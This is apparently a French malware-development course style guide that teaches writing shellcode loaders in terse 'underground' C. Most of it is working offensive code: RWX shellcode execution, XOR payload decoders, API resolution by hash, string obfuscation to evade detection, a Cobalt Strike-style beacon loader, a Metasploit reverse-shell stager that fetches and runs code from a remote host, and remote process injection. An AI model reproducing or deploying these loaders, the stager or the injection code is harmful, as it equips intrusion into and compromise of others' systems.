# Style Guide Maldev

> Ce guide documente les conventions de code utilisées dans les vrais malwares analysés.
> L'objectif : que le code du cours reflète la réalité du terrain, pas un cours académique.

---

## Philosophie

```
Académique : "Je comprends ce que fait ce code"
Maldev     : "Je dois analyser ce code pour comprendre"
```

Le vrai maldev est **intentionnellement obscur** sans être illisible.

---

## Conventions de nommage

### Variables

```c
// ACADEMIQUE (ce qu'on ne fait PAS)
unsigned char shellcode_buffer[256];
int payload_length;
HANDLE process_handle;
void* allocated_memory_address;

// MALDEV (ce qu'on fait)
unsigned char buf[256];
int len;
HANDLE h;
void* p;
```

### Patterns courants dans les samples

| Academique | Maldev | Notes |
|-----------|--------|-------|
| `shellcode` | `sc`, `buf`, `payload`, `stub` | |
| `length/size` | `len`, `sz`, `cb` | cb = count of bytes (Windows) |
| `handle` | `h`, `hProc`, `hThread` | |
| `pointer` | `p`, `ptr`, `lp` | lp = long pointer (legacy) |
| `address` | `addr`, `va`, `rva` | va=virtual address |
| `buffer` | `buf`, `b`, `lpBuffer` | |
| `function_pointer` | `fn`, `pfn`, `pFunc` | |
| `result/return` | `r`, `ret`, `status` | |
| `iterator` | `i`, `j`, `k` | |

### Fonctions

```c
// ACADEMIQUE
void* allocate_executable_memory(size_t size);
BOOL inject_shellcode_into_process(HANDLE hProc, void* shellcode, size_t size);
FARPROC resolve_api_by_hash(DWORD hash);

// MALDEV
void* alloc(size_t sz);
BOOL inject(HANDLE h, void* sc, size_t len);
FARPROC resolve(DWORD h);
```

---

## Structure du code

### Headers minimalistes

```c
// ACADEMIQUE
/*
 * =============================================================================
 * Module XX : Titre du module
 * =============================================================================
 *
 * PREREQUIS :
 * -----------
 * - Module precedent
 * - Comprendre concept X
 *
 * CE QUE TU VAS APPRENDRE :
 * -------------------------
 * - Point 1
 * - Point 2
 */

// MALDEV
// xor stub + VirtualAlloc exec
// ref: https://github.com/xxx/sample
```

### Commentaires

```c
// ACADEMIQUE
// Cette fonction alloue de la memoire avec les permissions RWX
// qui permettent d'executer du code arbitraire
void* allocate_executable_memory(size_t size) {
    // VirtualAlloc retourne l'adresse de base de la region allouee
    return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

// MALDEV
void* alloc(size_t sz) {
    return VirtualAlloc(0, sz, 0x3000, 0x40); // RWX
}
```

### Magic numbers

```c
// ACADEMIQUE
#define MEM_COMMIT_RESERVE (MEM_COMMIT | MEM_RESERVE)  // 0x3000
#define PAGE_RWX PAGE_EXECUTE_READWRITE                 // 0x40

VirtualAlloc(NULL, size, MEM_COMMIT_RESERVE, PAGE_RWX);

// MALDEV - magic numbers directs
VirtualAlloc(0, sz, 0x3000, 0x40);

// Ou avec commentaire minimal
VirtualAlloc(0, sz, 0x3000, 0x40); // commit+reserve, rwx
```

---

## Patterns de code real-world

### XOR Decoder (pattern classique)

```c
// Version academique
void xor_decode(unsigned char* data, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] = data[i] ^ key;
    }
}

// Version maldev (Cobalt Strike style)
void xor(BYTE* b, DWORD l, BYTE k) {
    while(l--) *b++ ^= k;
}

// Version encore plus compacte
#define X(b,l,k) do{BYTE*_=b;DWORD n=l;while(n--)*_++^=k;}while(0)
```

### API Resolution par hash

```c
// Academique
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwHash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    // ... 50 lignes de code commente ...
}

// Maldev (style Metasploit/CS)
FARPROC gpa(HMODULE m, DWORD h) {
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)m;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)m + d->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY e = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)m +
        n->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)m + e->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)m + e->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)m + e->AddressOfFunctions);

    for(DWORD i = 0; i < e->NumberOfNames; i++) {
        char* name = (char*)m + names[i];
        if(hash(name) == h)
            return (FARPROC)((BYTE*)m + funcs[ords[i]]);
    }
    return 0;
}
```

### Shellcode Execution

```c
// Academique
void execute_shellcode(unsigned char* shellcode, size_t size) {
    // Allouer de la memoire executable
    void* exec_mem = VirtualAlloc(
        NULL,                          // Adresse de base (systeme choisit)
        size,                          // Taille en bytes
        MEM_COMMIT | MEM_RESERVE,      // Type d'allocation
        PAGE_EXECUTE_READWRITE         // Permissions RWX
    );

    if (exec_mem == NULL) {
        printf("[!] VirtualAlloc failed\n");
        return;
    }

    // Copier le shellcode
    memcpy(exec_mem, shellcode, size);

    // Creer un pointeur de fonction et executer
    ((void(*)())exec_mem)();
}

// Maldev
void exec(BYTE* sc, DWORD len) {
    void* p = VirtualAlloc(0, len, 0x3000, 0x40);
    memcpy(p, sc, len);
    ((void(*)())p)();
}

// One-liner style
#define EXEC(sc,len) ((void(*)())(memcpy(VirtualAlloc(0,len,0x3000,0x40),sc,len)))()
```

---

## Structures

### Definition

```c
// Academique
typedef struct _SHELLCODE_CONFIG {
    unsigned char* shellcode_buffer;
    size_t shellcode_length;
    unsigned char xor_key;
    BOOL is_encoded;
} SHELLCODE_CONFIG, *PSHELLCODE_CONFIG;

// Maldev
typedef struct {
    BYTE* buf;
    DWORD len;
    BYTE key;
    BOOL enc;
} CONFIG;
```

### Cast aggressif

```c
// Academique
IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)module_base;
IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module_base + dos_header->e_lfanew);

// Maldev
#define RVA(base, rva) ((BYTE*)(base) + (rva))
#define DOS(m) ((IMAGE_DOS_HEADER*)(m))
#define NT(m)  ((IMAGE_NT_HEADERS*)(RVA(m, DOS(m)->e_lfanew)))
```

---

## Obfuscation de strings (patterns reels)

### Stack strings

```c
// Visible dans .rodata
char* api = "VirtualAlloc";

// Stack string (pas dans .rodata)
char api[13];
api[0]='V';api[1]='i';api[2]='r';api[3]='t';api[4]='u';api[5]='a';
api[6]='l';api[7]='A';api[8]='l';api[9]='l';api[10]='o';api[11]='c';api[12]=0;

// Plus elegant
char api[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
```

### XOR inline

```c
// Encoded string + decode inline
BYTE enc[] = {0x14,0x2b,0x30,0x36,0x37,0x23,0x2e,0x01,0x2e,0x2e,0x2d,0x25}; // VirtualAlloc^0x42
for(int i=0;i<12;i++) enc[i]^=0x42;
```

---

## Patterns de samples connus

### Cobalt Strike Beacon style

```c
typedef struct {
    WORD len;
    BYTE data[];
} BLOB;

void go(BLOB* b) {
    BYTE k = b->data[0];
    for(int i=1; i<b->len; i++)
        b->data[i] ^= k;
    ((void(*)())(b->data+1))();
}
```

### Metasploit stager pattern

```c
// Reverse shell stager minimal
WSADATA w;
WSAStartup(0x202,&w);
SOCKET s=WSASocketA(2,1,0,0,0,0);
struct sockaddr_in a={.sin_family=2,.sin_port=htons(4444),.sin_addr.s_addr=inet_addr("192.168.1.1")};
connect(s,(void*)&a,16);
char b[1024];
recv(s,b,1024,0);
((void(*)())b)();
```

### Process Injection minimal

```c
HANDLE h = OpenProcess(0x1F0FFF, 0, pid); // PROCESS_ALL_ACCESS
void* p = VirtualAllocEx(h, 0, len, 0x3000, 0x40);
WriteProcessMemory(h, p, sc, len, 0);
CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
```

---

## Transformation des modules

Chaque module doit maintenant avoir :

1. **Section pedagogique** (style actuel) - pour comprendre les concepts
2. **Section "// --- RAW MALDEV ---"** - le meme code, style underground
3. **Section "// --- REAL SAMPLES ---"** - patterns de vrais malwares analyses

Exemple de structure :

```c
// ============================================================================
// DEMO : Allocation memoire executable
// ============================================================================

/* PEDAGOGIQUE - pour comprendre */
void demo_allocation_pedagogique(void) {
    printf("=== Allocation memoire executable ===\n");

    void* memory = VirtualAlloc(
        NULL,                      // Laisser le systeme choisir l'adresse
        4096,                      // Taille d'une page
        MEM_COMMIT | MEM_RESERVE,  // Reserver ET committer
        PAGE_EXECUTE_READWRITE     // Permissions Read/Write/Execute
    );

    if (memory != NULL) {
        printf("[+] Memoire allouee a %p\n", memory);
    }
}

/* --- RAW MALDEV --- */
void* alloc_rwx(size_t sz) {
    return VirtualAlloc(0, sz, 0x3000, 0x40);
}

/* --- REAL SAMPLES ---
 * Pattern: Cobalt Strike beacon loader
 * Source: SANS analysis 2023
 */
void beacon_alloc(BYTE* sc, DWORD len) {
    void* p = VirtualAlloc(0, len, 0x3000, 0x40);
    __movsb(p, sc, len);  // intrinsic, evite memcpy import
    ((void(*)())p)();
}
```

---

## References

- vx-underground samples
- Hasherezade's analysis
- MITRE ATT&CK techniques
- Cobalt Strike deobfuscated
- Metasploit Framework source
